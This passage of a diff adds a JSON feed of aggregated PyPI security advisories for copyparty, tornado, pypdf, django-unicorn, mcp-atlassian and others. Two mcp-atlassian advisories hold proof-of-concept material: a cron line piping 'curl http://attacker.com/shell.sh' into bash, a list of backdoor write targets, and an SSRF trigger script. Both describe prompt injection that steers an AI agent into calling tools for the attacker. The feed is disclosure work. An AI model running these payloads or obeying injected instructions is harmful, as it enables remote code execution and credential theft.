href=\"https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf\">https://github.com/9001/copyparty/security/advisories/GHSA-rcp6-88mm-9vgf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32109\">https://nvd.nist.gov/vuln/detail/CVE-2026-32109</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rcp6-88mm-9vgf\">https://github.com/advisories/GHSA-rcp6-88mm-9vgf</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:22:54.000Z",
+          "date_published": "2026-03-12T14:22:53.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-rcp6-88mm-9vgf"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "225a10c9161c226023c928bcd8104498",
+        "url": "https://github.com/advisories/GHSA-67rw-2x62-mqqm",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[copyparty] Copyparty ftp/sftp: Sharing a single file did not fully restrict source-folder access",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-67rw-2x62-mqqm"
+          ],
+          "content_hash": "sha256:bafe2a003d68d8ecc912641ce36f58e5ccad25828168aa1305f96db074c0fbc7"
+        },
+        "signals": {
+          "severity": {
+            "level": "critical",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-67rw-2x62-mqqm"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<p>There was a missing permission-check in the shares feature (the <code>shr</code> global-option).</p>\n<p>This vulnerability only applies in the following scenario:</p>\n<ul>\n<li>The <a href=\"https://github.com/9001/copyparty/#shares\">shares</a> feature is used for the specific purpose of creating a share of just a single file inside a folder</li>\n<li>Either the FTP or SFTP server is enabled, and also made publically accessible<ul>\n<li>If a share is password-protected, then SFTP was not vulnerable unless the <code>sftp-pw</code> global-option was also enabled</li>\n</ul>\n</li>\n</ul>\n<p>Given these conditions, when a user is browsing a share through either FTP or SFTP (not http or https), they can gain read-access to the remaining files inside the shared folder by guessing/bruteforcing the filenames.</p>\n<p>It was not possible to descend into subdirectories in this manner; only the sibling files were accessible.</p>\n<p>This issue did not affect filekeys or dirkeys.</p>\n<p>This vulnerability is <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-58753\">CVE-2025-58753</a> which was previously fixed for HTTP and HTTPS, but not for FTP. The FTPS server did not yet exist at that time.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm\">https://github.com/9001/copyparty/security/advisories/GHSA-67rw-2x62-mqqm</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32108\">https://nvd.nist.gov/vuln/detail/CVE-2026-32108</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-67rw-2x62-mqqm\">https://github.com/advisories/GHSA-67rw-2x62-mqqm</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:22:47.000Z",
+          "date_published": "2026-03-12T14:22:46.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-67rw-2x62-mqqm"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "f66a607fd047524fba1ceef051191f17",
+        "url": "https://github.com/advisories/GHSA-qjxf-f2mg-c6mc",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[tornado] Tornado is vulnerable to DoS due to too many multipart parts",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qjxf-f2mg-c6mc"
+          ],
+          "content_hash": "sha256:66fb93ee5762ba09e6242fa6f2c4b50e2b984bee72deb0d2dbf8417dd9a90c60"
+        },
+        "source_payload": {
+          "content_html": "<p>In versions of Tornado prior to 6.5.5, the only limit on the number of parts in <code>multipart/form-data</code> is the <code>max_body_size</code> setting (default 100MB). Since parsing occurs synchronously on the main thread, this creates the possibility of denial-of-service due to the cost of parsing very large multipart bodies with many parts. </p>\n<p>Tornado 6.5.5 introduces new limits on the size and complexity of multipart bodies, including a default limit of 100 parts per request. These limits are configurable if needed; see <code>tornado.httputil.ParseMultipartConfig</code>. It is also now possible to disable <code>multipart/form-data</code> parsing entirely if it is not required for the application.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc\">https://github.com/tornadoweb/tornado/security/advisories/GHSA-qjxf-f2mg-c6mc</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-31958\">https://nvd.nist.gov/vuln/detail/CVE-2026-31958</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839\">https://github.com/tornadoweb/tornado/commit/119a195e290c43ad2d63a2cf012c29d43d6ed839</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/releases/tag/v6.5.5\">https://github.com/tornadoweb/tornado/releases/tag/v6.5.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qjxf-f2mg-c6mc\">https://github.com/advisories/GHSA-qjxf-f2mg-c6mc</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:19:53.000Z",
+          "date_published": "2026-03-12T14:19:52.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qjxf-f2mg-c6mc"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "1eba00618bb0a4f0a9814bb099035a1d",
+        "url": "https://github.com/advisories/GHSA-78cv-mqj4-43f7",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[tornado] Tornado has incomplete validation of cookie attributes",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-78cv-mqj4-43f7"
+          ],
+          "content_hash": "sha256:35a4fbfc2a111e3d8b61615614cee7e8374e76a9d5969f848d926b3d00a755bb"
+        },
+        "source_payload": {
+          "content_html": "<p>Values passed to the <code>domain</code>, <code>path</code>, and <code>samesite</code> arguments of <code>RequestHandler.set_cookie</code> were not completely validated in versions of Tornado prior to 6.5.5. In particular, semicolons would be allowed, which could be used to inject attacker-controlled values for other cookie attributes.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7\">https://github.com/tornadoweb/tornado/security/advisories/GHSA-78cv-mqj4-43f7</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104\">https://github.com/tornadoweb/tornado/commit/24a2d96ea115f663b223887deb0060f13974c104</a></li>\n<li><a href=\"https://github.com/tornadoweb/tornado/releases/tag/v6.5.5\">https://github.com/tornadoweb/tornado/releases/tag/v6.5.5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-78cv-mqj4-43f7\">https://github.com/advisories/GHSA-78cv-mqj4-43f7</a></li>\n</ul>\n",
+          "date_modified": "2026-03-11T22:17:04.000Z",
+          "date_published": "2026-03-11T22:17:00.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-78cv-mqj4-43f7"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "aafc48774e9509d9df32688f1ec36e32",
+        "url": "https://github.com/advisories/GHSA-hqmh-ppp3-xvm7",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[pypdf] pypdf: manipulated stream length values can exhaust RAM",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-hqmh-ppp3-xvm7"
+          ],
+          "content_hash": "sha256:285da9cc35acb2528d9e33079a9bee7cb0421ed1b4a0044acce953b3cad82341"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing a content stream with a rather large <code>/Length</code> value, regardless of the actual data length inside the stream.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been fixed in <a href=\"https://github.com/py-pdf/pypdf/releases/tag/6.8.0\">pypdf==6.8.0</a>.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>If you cannot upgrade yet, consider applying the changes from PR <a href=\"https://github.com/py-pdf/pypdf/pull/3675\">#3675</a>.</p>\n<p>As far as we are aware, this mostly affects reading from buffers of unknown size, as returned by <code>open(\"file.pdf\", mode=\"rb\")</code> for example. Passing a file path or a <code>BytesIO</code> buffer to <em>pypdf</em> instead does not seem to trigger the vulnerability.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/py-pdf/pypdf/security/advisories/GHSA-hqmh-ppp3-xvm7\">https://github.com/py-pdf/pypdf/security/advisories/GHSA-hqmh-ppp3-xvm7</a></li>\n<li><a href=\"https://github.com/py-pdf/pypdf/pull/3675\">https://github.com/py-pdf/pypdf/pull/3675</a></li>\n<li><a href=\"https://github.com/py-pdf/pypdf/commit/3c550b3196adeba1506a26e57c09c09fac75e9aa\">https://github.com/py-pdf/pypdf/commit/3c550b3196adeba1506a26e57c09c09fac75e9aa</a></li>\n<li><a href=\"https://github.com/py-pdf/pypdf/releases/tag/6.8.0\">https://github.com/py-pdf/pypdf/releases/tag/6.8.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-31826\">https://nvd.nist.gov/vuln/detail/CVE-2026-31826</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hqmh-ppp3-xvm7\">https://github.com/advisories/GHSA-hqmh-ppp3-xvm7</a></li>\n</ul>\n",
+          "date_modified": "2026-03-11T05:46:58.000Z",
+          "date_published": "2026-03-11T00:14:02.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-hqmh-ppp3-xvm7"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "e391c4032201b8107210514a413943b3",
+        "url": "https://github.com/advisories/GHSA-ffv6-jj46-x367",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[django-unicorn] django-unicorn affected by component state manipulation via unvalidated attribute access",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-ffv6-jj46-x367"
+          ],
+          "content_hash": "sha256:842ab0f710457721db10befc2fb221ecdcb9e18b42b109da42b81c27625a3197"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Component state manipulation is possible in <code>django-unicorn</code> due to missing access control checks during property updates and method calls. An attacker can bypass the intended <code>_is_public</code> protection to modify internal attributes such as <code>template_name</code> or trigger protected methods.</p>\n<h2 id=\"vulnerability-details-component-access-control-bypass\">Vulnerability Details: Component Access Control Bypass</h2>\n<p>Security analysis identified that the framework fails to enforce visibility boundaries defined by <code>_is_public</code> within the action parsers. Specifically, the logic in <code>set_property_value()</code> and <code>_call_method_name()</code> utilizes <code>getattr</code> and <code>setattr</code> directly on component instances without verifying if the target attribute or method is explicitly marked as public.</p>\n<p>Vulnerability resides in:</p>\n<ul>\n<li><code>src/django_unicorn/views/action_parsers/call_method.py</code></li>\n<li><code>src/django_unicorn/views/action_parsers/utils.py</code></li>\n</ul>\n<p>While Django's template engine restricts rendering to registered directories, an unauthorized user can still force a component to render sensitive templates (e.g., admin layouts) from other installed applications or reset the component state by invoking the internal <code>reset()</code> method.</p>\n<h2 id=\"proof-of-concept-poc\">Proof of Concept (PoC)</h2>\n<p>Attacker can overwrite the <code>template_name</code> attribute by sending a crafted JSON payload to the message endpoint:</p>\n<ol>\n<li>Construct a payload targeting a protected attribute:<pre><code class=\"language-json\">{\n  \"actionQueue\": [\n    {\n      \"type\": \"syncInput\",\n      \"payload\": { \"name\": \"template_name\", \"value\": \"admin/base.html\" }\n    }\n  ],\n  \"data\": {},\n  \"meta\": \"&lt;checksum_of_empty_dict&gt;\"\n}\n</code></pre>\n</li>\n<li>The server-side component updates its internal state: <code>self.template_name = \"admin/base.html\"</code>.</li>\n<li>Subsequent re-rendering displays the content of the targeted template, bypassing intended component logic.</li>\n</ol>\n<h2 id=\"impact\">Impact</h2>\n<p>Low severity. The risk is limited to unauthorized manipulation of component state and rendering of existing templates within the application's configured template directories. Remote Code Execution (RCE) is not possible via this vector.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367\">https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-31815\">https://nvd.nist.gov/vuln/detail/CVE-2026-31815</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ffv6-jj46-x367\">https://github.com/advisories/GHSA-ffv6-jj46-x367</a></li>\n</ul>\n",
+          "date_modified": "2026-03-11T05:45:51.000Z",
+          "date_published": "2026-03-11T00:11:08.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-ffv6-jj46-x367"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "c156835decfedaee92dcad4dd9e284f3",
+        "url": "https://github.com/advisories/GHSA-xjgw-4wvw-rgm4",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[mcp-atlassian] MCP Atlassian has an arbitrary file write leading to arbitrary code execution via unconstrained download_path in confluence_download_attachment",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-xjgw-4wvw-rgm4"
+          ],
+          "content_hash": "sha256:f84405fb8915fa68418e3371df88210a9b52b3a74413e4790fdbe1460cfb415d"
+        },
+        "signals": {
+          "severity": {
+            "level": "high",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-xjgw-4wvw-rgm4"
+            }
+          }
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>confluence_download_attachment</code> MCP tool accepts a <code>download_path</code> parameter that is written to without any directory boundary enforcement. An attacker who can call this tool and supply or access a Confluence attachment with malicious content can write arbitrary content to any path the server process has write access to. Because the attacker controls both the write destination and the written content (via an uploaded Confluence attachment), this constitutes for arbitrary code execution (for example, writing a valid cron entry to <code>/etc/cron.d/</code> achieves code execution within one scheduler cycle with no server restart required).</p>\n<h3 id=\"details\">Details</h3>\n<p>The tool parameter is defined in <code>src/mcp_atlassian/servers/confluence.py:~1275</code> without any path restriction:</p>\n<pre><code class=\"language-python\">download_path: Annotated[\n    str,\n    Field(\n        description=(\n            \"Full path where the file should be saved. Can be absolute or relative. \"\n            \"Examples: './downloads/report.pdf', '/tmp/image.png', 'C:\\\\\\\\temp\\\\\\\\file.docx'. \"\n            \"Parent directory will be created if it doesn't exist.\"\n        )\n    ),\n],\n\n The implementation at src/mcp_atlassian/confluence/attachments.py:183–200:\n\nif not os.path.isabs(target_path):\n    target_path = os.path.abspath(target_path)  # normalizes path, no restriction\n\nos.makedirs(os.path.dirname(target_path), exist_ok=True)  # creates any directory\nwith open(target_path, \"wb\") as f:                        # writes to any writable path\n    for chunk in response.iter_content(chunk_size=8192):\n        f.write(chunk)\n\n os.path.abspath() converts relative paths to absolute but performs no directory boundary check. No configurable base download directory is enforced. There is no validation between the tool parameter and the file write. The same issue exists in download_content_attachments via its target_dir parameter (src/mcp_atlassian/servers/confluence.py:~1389).\n\n\n### PoC\nPrerequisites: Confluence credentials with access to at least one page. To control the written file content, upload a malicious attachment to any Confluence page you have write access to.\n\nStep 1 — Prepare the payload. Create a file containing a valid cron entry and upload it as a Confluence attachment:\n\n* * * * * root curl http://attacker.com/shell.sh | bash\n\nStep 2 — Call the tool with a sensitive write target:\n\n{\n    \"jsonrpc\": \"2.0\",\n    \"method\": \"tools/call\",\n    \"params\": {\n        \"name\": \"confluence_download_attachment\",\n        \"arguments\": {\n            \"page_id\": \"&lt;page id hosting the malicious attachment&gt;\",\n            \"attachment_id\": \"&lt;attachment id&gt;\",\n            \"download_path\": \"/etc/cron.d/mcp-backdoor\"\n        }\n    },\n    \"id\": 1\n}\n\nThe attachment content is written verbatim to /etc/cron.d/mcp-backdoor. The system scheduler executes it within one minute with no further attacker action required.\n\nAlternative potential write targets demonstrating broader impact:\n- /home/&lt;user&gt;/.ssh/authorized_keys - persistent SSH backdoor\n- &lt;venv&gt;/lib/python3.x/site-packages/&lt;any_imported_module&gt;.py - code execution on next import\n- ~/.bashrc - code execution on next user login\n\n### Impact\nAn attacker who can invoke MCP tools and upload (or access) a Confluence attachment with controlled content can achieve arbitrary code execution on the server host. The MCP HTTP transport endpoints carry no authentication by default, meaning any host that can reach the server's HTTP port can call tools using the server's own embedded Confluence credentials (global fallback). The default HOST=0.0.0.0 binding makes this reachable from the local network without any configuration change.\n\nIn enterprise deployments where Confluence write access is broadly granted, the effective attacker prerequisite reduces to network access to the MCP HTTP port. This is also reachable without direct network access: a malicious Confluence page can embed LLM instructions directing an AI agent to call confluence_download_attachment with attacker-specified parameters, achieving code execution through the agent as an unwitting intermediary.\n\nExample potential RCE paths:\n 1. Cron job injection - write a cron entry to /etc/cron.d/; executes within one scheduler cycle, no restart required\n 2. Python package hijack - overwrite any .py module in the application's virtual environment; executes on next import or server restart.\n 3. SSH authorized_keys - write an attacker-controlled public key; grants persistent interactive shell access.\n 4. Shell profile injection - write to ~/.bashrc or ~/.profile; executes on next user login.\n### References\n\n- &lt;https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-xjgw-4wvw-rgm4&gt;\n- &lt;https://github.com/sooperset/mcp-atlassian/commit/52b9b0997681e87244b20d58034deae89c91631e&gt;\n- &lt;https://github.com/advisories/GHSA-xjgw-4wvw-rgm4&gt;\n</code></pre>\n",
+          "date_modified": "2026-03-10T18:56:11.000Z",
+          "date_published": "2026-03-10T18:56:07.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-xjgw-4wvw-rgm4"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "daf98c2089b7afbd125c94dc382dcb85",
+        "url": "https://github.com/advisories/GHSA-7r34-79r5-rcc9",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[mcp-atlassian] MCP Atlassian has SSRF via unvalidated X-Atlassian-Jira-Url / X-Atlassian-Confluence-Url headers",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-7r34-79r5-rcc9"
+          ],
+          "content_hash": "sha256:3c463e779c7928fa2b5af15f5b2375817b71dd842235e26a7df51d345ca69cd2"
+        },
+        "source_payload": {
+          "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An unauthenticated attacker who can reach the mcp-atlassian HTTP endpoint can force the server process to make outbound HTTP requests to an arbitrary attacker-controlled URL by supplying two custom HTTP headers without an <code>Authorization</code> header. No authentication is required. The vulnerability exists in the HTTP middleware and dependency injection layer — not in any MCP tool handler - making it invisible to tool-level code analysis. In cloud deployments, this could enable theft of IAM role credentials via the instance metadata endpoint (<code>169.254.169.254</code>). In any HTTP deployment it enables internal network reconnaissance and injection of attacker-controlled content into LLM tool results.</p>\n<h3 id=\"details\">Details</h3>\n<p>The server supports a multi-tenant HTTP authentication mode where clients supply per-request Jira/Confluence URLs via custom headers. The middleware (<code>src/mcp_atlassian/servers/main.py:436–448</code>) extracts <code>X-Atlassian-Jira-Url</code> from the request and stores it in request state with no validation. The dependency provider (<code>src/mcp_atlassian/servers/dependencies.py:189–217</code>) then uses this value directly as the <code>url=</code> parameter when constructing a <code>JiraConfig</code> and <code>JiraFetcher</code>. The first method call on the fetcher (<code>get_current_user_account_id()</code>) immediately issues a <code>GET</code> request to <code>{header_url}/rest/api/2/myself</code> — an outbound SSRF call to the attacker-controlled URL.</p>\n<p>No comparison is made against the server-configured <code>JIRA_URL</code> environment variable. No private IP range blocklist is applied. No URL scheme allowlist is enforced.</p>\n<p>  <strong>Trigger conditions — all four must hold:</strong></p>\n<ol>\n<li>Server running with <code>--transport streamable-http</code> or <code>--transport sse</code></li>\n<li>Request contains <code>X-Atlassian-Jira-Url</code> header (any non-empty value)</li>\n<li>Request contains <code>X-Atlassian-Jira-Personal-Token</code> header (any non-empty value)</li>\n<li>Request has <strong>no</strong> <code>Authorization</code> header</li>\n</ol>\n<p>  An identical vulnerability exists for Confluence at <code>dependencies.py:341–393</code> via <code>X-Atlassian-Confluence-Url</code> +\n  <code>X-Atlassian-Confluence-Personal-Token</code>.</p>\n<p>  <strong>Root cause - middleware</strong> (<code>src/mcp_atlassian/servers/main.py:436–448</code>):</p>\n<pre><code class=\"language-python\"># When service headers are present and no Authorization header is provided,\n# auth type is set to \"pat\" but user_atlassian_token is NOT set.\n# This is what routes execution to the vulnerable path below.\nif service_headers and (jira_token_str and jira_url_str):\n    scope[\"state\"][\"user_atlassian_auth_type\"] = \"pat\"\n\nRoot cause - dependency provider (src/mcp_atlassian/servers/dependencies.py:189–217):\nif (\n    user_auth_type == \"pat\"\n    and jira_url_header           # attacker-controlled, no validation\n    and jira_token_header\n    and not hasattr(request.state, \"user_atlassian_token\")\n):\n    header_config = JiraConfig(\n        url=jira_url_header,      # used directly, no allowlist check\n        personal_token=jira_token_header,\n        ...\n    )\n    header_jira_fetcher = JiraFetcher(config=header_config)\n    header_jira_fetcher.get_current_user_account_id()\n    # ^ GET {jira_url_header}/rest/api/2/myself — outbound SSRF call\n    request.state.jira_fetcher = header_jira_fetcher  # cached for all tool calls this request\n\n\n### PoC\nStep 1 - Start a listener to capture the inbound SSRF request:\n\n# listener.py\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport json, sys\n\nclass Handler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        print(f\"[SSRF RECEIVED] Path: {self.path}\", file=sys.stderr)\n        print(f\"[SSRF RECEIVED] Headers: {dict(self.headers)}\", file=sys.stderr)\n        self.send_response(200)\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        if \"myself\" in self.path:\n            self.wfile.write(json.dumps({\n                \"accountId\": \"ssrf-confirmed\",\n                \"displayName\": \"SSRF PoC\"\n            }).encode())\n        else:\n            self.wfile.write(b\"{}\")\n    def log_message(self, *args): pass\n\nHTTPServer((\"0.0.0.0\", 8888), Handler).serve_forever()\n\nStep 2 - Start mcp-atlassian in HTTP transport mode (placeholder credentials are sufficient — the vulnerable path is reached before any real Atlassian instance is contacted):\n\nJIRA_URL=https://placeholder.atlassian.net \\\nJIRA_API_TOKEN=placeholder \\\nmcp-atlassian --transport streamable-http --port 8000\n\nStep 3 — Trigger the SSRF:\n\nimport httpx, json\n\nMCP    = \"http://localhost:8000/mcp\"\nATTACK = \"http://&lt;listener-ip&gt;:8888\"\n\n# Initialize MCP session\nr = httpx.post(MCP, json={\n    \"jsonrpc\": \"2.0\", \"method\": \"initialize\",\n    \"params\": {\"protocolVersion\": \"2024-11-05\", \"capabilities\": {},\n               \"clientInfo\": {\"name\": \"poc\", \"version\": \"1.0\"}},\n    \"id\": 1\n}, headers={\n    \"X-Atlassian-Jira-Url\": ATTACK,\n    \"X-Atlassian-Jira-Personal-Token\": \"any-value\",\n    # No Authorization header — this is the key condition\n})\nsid = r.headers.get(\"mcp-session-id\")\n\n# Call any Jira tool — this triggers get_jira_fetcher() and the outbound SSRF call\nhttpx.post(MCP, json={\n    \"jsonrpc\": \"2.0\", \"method\": \"tools/call\",\n    \"params\": {\"name\": \"jira_get_issue\", \"arguments\": {\"issue_key\": \"PROJ-1\"}},\n    \"id\": 2\n}, headers={\n    \"X-Atlassian-Jira-Url\": ATTACK,\n    \"X-Atlassian-Jira-Personal-Token\": \"any-value\",\n    \"Mcp-Session-Id\": sid,\n})\n\nThe listener will receive GET /rest/api/2/myself originating from the MCP server process, confirming the SSRF.\n\n\n### Impact\nThis vulnerability affects any deployment using `--transport streamable-http` or `--transport sse`. The default HOST=0.0.0.0 binding exposes the HTTP endpoint to any host on the same network without any configuration change, and to the internet when deployed on a cloud instance.\n\n- Any HTTP deployment: The server acts as an SSRF proxy, enabling reconnaissance of internal services (databases, internal APIs, microservices)\nnot directly reachable from outside the network.\n- AI agent sessions: Once the attacker-controlled fetcher is cached in request.state, all Jira tool responses for that session originate from the attacker's server. The attacker can return crafted API responses containing LLM instructions, injecting those instructions into the AI agent's context as if they were legitimate Jira data - a prompt injection channel at the data layer requiring no tool parameter manipulation.\n- Cloud deployments: Any network-reachable attacker can potentially steal the server's IAM role credentials via the instance metadata service, gaining full access to all cloud resources that role permits.\n### References\n\n- &lt;https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-7r34-79r5-rcc9&gt;\n- &lt;https://github.com/sooperset/mcp-atlassian/commit/5cd697dfce9116ef330b8dc7a91291640e0528d9&gt;\n- &lt;https://github.com/advisories/GHSA-7r34-79r5-rcc9&gt;\n</code></pre>\n",
+          "date_modified": "2026-03-10T18:48:50.000Z",
+          "date_published": "2026-03-10T18:48:46.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-7r34-79r5-rcc9"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "c30d33c1a06d21e09b10792e1ab9874e",
+        "url": "https://github.com/advisories/GHSA-qhqw-rrw9-25rm",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[asyncmy] asyncmy is vulnerable to SQL injection via crafted dict keys",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-qhqw-rrw9-25rm"
+          ],
+          "content_hash": "sha256:0db4173a3fa3d9f736838663ae3584a76c98867f40a0bdadfa827f8afebd9bab"
+        },
+        "source_payload": {
+          "content_html": "<p>SQL injection vulnerability in long2ice asyncmy thru 0.2.10 allows attackers to execute arbitrary SQL commands via crafted dict keys.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-65896\">https://nvd.nist.gov/vuln/detail/CVE-2025-65896</a></li>\n<li><a href=\"https://github.com/long2ice/asyncmy/issues/134\">https://github.com/long2ice/asyncmy/issues/134</a></li>\n<li><a href=\"https://github.com/long2ice/asyncmy\">https://github.com/long2ice/asyncmy</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qhqw-rrw9-25rm\">https://github.com/advisories/GHSA-qhqw-rrw9-25rm</a></li>\n</ul>\n",
+          "date_modified": "2026-03-10T17:50:58.000Z",
+          "date_published": "2025-12-02T21:31:30.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-qhqw-rrw9-25rm"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "pypi_security_advisories",
+        "id": "b3200b05dcf4f20fa8bab7ab90cd2bb7",
+        "url": "https://github.com/advisories/GHSA-rv5f-ccpm-xjj4",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[apache-airflow-providers-amazon] Apache Airflow AWS Auth Manager has Host Header Injection Leading to SAML Authentication Bypass",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:51:10Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-rv5f-ccpm-xjj4"
+          ],
+          "content_hash": "sha256:e820ee0b359e9d92df627f46b255726d573c99dd5cccf744db71277cd1320251"
+        },
+        "signals": {
+          "severity": {
+            "level": "low",
+            "source": "keyword",
+            "provenance": {
+              "method": "keyword_scan",
+              "authority": "PyPI Security Advisories",
+              "authority_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
+              "evidence_url": "https://github.com/advisories/GHSA-rv5f-ccpm-xjj4"
+            }
+          }
+        },
+        "source_payload": {
